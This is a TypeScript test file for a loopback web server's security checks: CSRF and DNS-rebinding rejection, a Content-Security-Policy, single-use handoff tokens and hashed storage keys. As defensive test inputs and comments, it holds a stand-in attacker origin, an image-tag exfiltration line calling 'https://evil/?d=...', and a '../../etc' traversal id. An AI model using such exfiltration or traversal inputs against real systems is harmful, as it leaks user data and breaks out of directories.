import type { IncomingMessage } from 'node:http'
import { describe, expect, it } from 'vitest'
import { SingleUserIdentity, storageKeyFor, timingSafeEquals } from './identity.js'
import { checkRequest, securityHeaders, type OriginPolicy } from './security.js'

const policy: OriginPolicy = {
  allowedHosts: ['127.0.0.1:7777', 'localhost:7777'],
  allowedOrigins: ['http://127.0.0.1:7777'],
}

function request(headers: Record<string, string>): IncomingMessage {
  return { headers } as unknown as IncomingMessage
}

describe('checkRequest', () => {
  it('accepts a same-origin API request', () => {
    const rejected = checkRequest(
      request({ host: '127.0.0.1:7777', origin: 'http://127.0.0.1:7777' }),
      policy,
      { requireOrigin: true },
    )
    expect(rejected).toBeUndefined()
  })

  /**
   * CSRF. Any page the user has open can POST to loopback; it cannot read the reply, but a
   * request that runs a shell command has already done its damage on the way in.
   */
  it('refuses a foreign origin', () => {
    const rejected = checkRequest(
      request({ host: '127.0.0.1:7777', origin: 'https://evil.example' }),
      policy,
      { requireOrigin: true },
    )
    expect(rejected?.status).toBe(403)
  })

  /**
   * DNS rebinding, and the reason `Host` is checked at all. Here the attacker's own domain
   * resolves to 127.0.0.1, so the Origin is genuinely theirs and consistent — the Origin
   * check passes. Only the Host header gives it away.
   */
  it('refuses a Host this server never bound, even with a matching Origin', () => {
    const rejected = checkRequest(
      request({ host: 'evil.example:7777', origin: 'http://evil.example:7777' }),
      policy,
      { requireOrigin: true },
    )
    expect(rejected?.status).toBe(421)
  })

  it('refuses an API request with no Origin at all', () => {
    const rejected = checkRequest(request({ host: '127.0.0.1:7777' }), policy, { requireOrigin: true })
    expect(rejected?.status).toBe(403)
  })

  /** A top-level navigation sends no Origin, which is how the page itself gets fetched. */
  it('allows a same-origin navigation with no Origin', () => {
    expect(checkRequest(request({ host: '127.0.0.1:7777' }), policy, { requireOrigin: false })).toBeUndefined()
  })

  it('refuses a request with no Host', () => {
    expect(checkRequest(request({}), policy, { requireOrigin: false })?.status).toBe(421)
  })
})

describe('securityHeaders', () => {
  /**
   * The specific exfiltration these two close: model output renders in this page, so a
   * reply containing `<img src="https://evil/?d=...">` would otherwise leak on render.
   */
  it('confines images and connections to this origin', () => {
    const csp = securityHeaders()['Content-Security-Policy'] ?? ''
    expect(csp).toContain("img-src 'self' data:")
    expect(csp).toContain("connect-src 'self'")
    expect(csp).toContain("frame-ancestors 'none'")
    expect(csp).toContain("form-action 'none'")
  })

  it('never allows another origin to read a response', () => {
    expect(Object.keys(securityHeaders())).not.toContain('Access-Control-Allow-Origin')
  })
})

describe('SingleUserIdentity', () => {
  it('rejects everything without the session token', async () => {
    const identity = new SingleUserIdentity()
    expect(await identity.authenticate(request({}))).toBeUndefined()
    expect(await identity.authenticate(request({ authorization: 'Bearer wrong' }))).toBeUndefined()
  })

  it('authenticates with the token the handoff produced', async () => {
    const identity = new SingleUserIdentity()
    const token = identity.redeemHandoff(identity.launchToken)
    expect(token).toBeDefined()
    expect(await identity.authenticate(request({ authorization: `Bearer ${token ?? ''}` }))).toMatchObject({
      id: 'local',
    })
  })

  /** The handoff travels in a URL fragment, which persists in shell and browser history. */
  it('spends the handoff token on first use', () => {
    const identity = new SingleUserIdentity()
    const handoff = identity.launchToken
    expect(identity.redeemHandoff(handoff)).toBeDefined()
    expect(identity.redeemHandoff(handoff)).toBeUndefined()
  })

  /**
   * A wrong guess is either a bug or an attack. In both cases the right answer is that the
   * token is now spent — otherwise it could be brute-forced for as long as it lives.
   */
  it('spends the handoff token even on a failed attempt', () => {
    const identity = new SingleUserIdentity()
    const handoff = identity.launchToken
    expect(identity.redeemHandoff('wrong')).toBeUndefined()
    expect(identity.redeemHandoff(handoff)).toBeUndefined()
  })
})

describe('timingSafeEquals', () => {
  it('compares without throwing on a length mismatch', () => {
    expect(timingSafeEquals('abc', 'abc')).toBe(true)
    expect(timingSafeEquals('abc', 'abcd')).toBe(false)
    expect(timingSafeEquals('', '')).toBe(true)
  })
})

describe('storageKeyFor', () => {
  /**
   * A directory service can return anything as an identifier. Hashing means no id can
   * escape its parent directory, and two different people can never collide onto one
   * folder — which on a shared server would mean reading each other's secrets.
   */
  it('produces a safe, stable, collision-resistant directory name', () => {
    const key = storageKeyFor({ id: 'S-1-5-21-1004336348', displayName: 'Someone' })
    expect(key).toMatch(/^[0-9a-f]{32}$/)
    expect(storageKeyFor({ id: 'S-1-5-21-1004336348', displayName: 'Renamed' })).toBe(key)
    expect(storageKeyFor({ id: '../../etc', displayName: 'x' })).toMatch(/^[0-9a-f]{32}$/)
    expect(storageKeyFor({ id: 'other', displayName: 'x' })).not.toBe(key)
  })
})
